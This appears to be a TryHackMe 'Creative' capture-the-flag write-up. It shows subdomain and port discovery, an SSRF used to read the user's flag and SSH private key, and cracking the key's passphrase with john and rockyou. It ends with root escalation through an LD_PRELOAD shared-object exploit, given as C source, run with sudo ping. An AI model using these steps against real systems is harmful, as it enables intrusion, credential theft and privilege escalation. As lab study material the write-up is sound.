1. Reconnaisez 
```
nmap -sCv <IP>
gobuster vhost -u http://creative.thm -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --append-domain
```

Here we found `beta-creative.thm`. We can use it.

2. 
```
ffuf -u http://beta.creative.thm/ -d "url=http://127.0.0.1:FUZZ/" -w <(seq 1 65535) -H "Content-Type: application/x-www-form-urlencoded" -mc all -fs 13 -t 50 -rate 1000
```

To find exact port: It's `80` and `1337`

3. 
Next lets use **burp**. Go to `proxy` try do post requests. First 
```
http://beta.creative.thm
	http://127.0.0.1:1337/
```

get this result and switch it to Repiter (Ctrl + R)


4. 
Here we can change the our requests and send it to host. So by the path `http://127.0.0.1:1337/home/saad/user.txt` we get user **flag**. Btw don't forget
encoded it to **url**
To get root flag:
```
http://127.0.0.1:1337/home/saad/id_rsa
```
Save the result on your machine. For instance as saad_id_rsa.


5. 
We can use this private key to connect ssh without password.
ssh -i saad_id_rsa saad@IP.
Oh don't forget get permission (**chmod 600 saad_id_rsa**)

Here ask passphrase
```
┌──(amir㉿kali)-[~/CTF-Writeups/TryHackMe/Creative]
└─$ ssh2john saad_id_rsa > ssh_hash.txt
                                                                             
┌──(amir㉿kali)-[~/CTF-Writeups/TryHackMe/Creative]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt

```

As a result: `sweetness        (saad_id_rsa)`

6. 
if you'll check the `/home/saad/.bash_history` you can see the saad's password.  Use it to run `sudo -l`
```
saad@ip-10-113-183-239:~$ sudo -l
[sudo] password for saad: 
Matching Defaults entries for saad on ip-10-113-183-239:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User saad may run the following commands on ip-10-113-183-239:
    (root) /usr/bin/ping
```

To use the vuln LD_PRELOAD:
1. make exploit file for example pe.c:
```
 #include <stdio.h>
 #include <sys/types.h>
 #include <unistd.h>
 #include <stdlib.h>
 
 void _init() {
     unsetenv("LD_PRELOAD");
     setgid(0);
     setuid(0);
     system("/bin/sh");>
 }

```
 
```
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

```
sudo LD_PRELOAD=/home/saad/pe.so /usr/bin/ping
```
Congrats now you are a sudo.
Just read the root.txt by the path: `/root/root.txt`

**Happy end!**
